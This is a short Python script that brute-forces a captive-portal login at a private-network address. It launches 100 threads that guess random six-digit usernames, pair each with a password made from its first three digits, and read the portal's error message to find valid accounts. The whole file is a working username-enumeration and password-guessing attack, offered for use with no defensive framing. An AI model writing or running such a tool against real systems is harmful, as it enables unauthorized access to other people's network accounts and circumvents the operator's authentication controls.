import requests, threading, time, random
dictionarys = []
username = '15103'
password = ''
isRun = True
def getRun():
    df = open('username.txt', 'r', encoding='utf-8')
    return df.read()
def setRun(x):
    df = open('username.txt', 'w',encoding='utf-8')
    df.writelines(str(x))
    df.close()
def randomNumber(main,length):
    x = main
    while(True):
        if(len(main)==length):
            if main not in dictionarys:
                return main
            else:
                main = x
        main += random.choice("0123456789")

def run():
    while(getRun()=='1'):
        print(f"count username Faild : ${len(dictionarys)}",end='\r')
        if getRun()=='0': return
        username = randomNumber("1",6)
        password = username[0:3]
        dictionarys.append(username)
        data = {
            'txtLogin':username,
            'txtPasswd':password,
            'btnLogin':'Login',
            'reqUrl':'http://10.99.92.1/webAuth/index.htm',
            'reqCheck':'false'
        }
        try:
            res = requests.post('http://172.16.0.1/portal/user-authen.php',data=data)
            for i in res:
                if "Loginname or Password is invalid! (2)" in str(i):
                    print(f"Username successfully ${username}")
                    # setRun(0)
        except:
            pass
        time.sleep(0.1)
    return 
for count in range(100):
    threading.Thread(target=run).start()
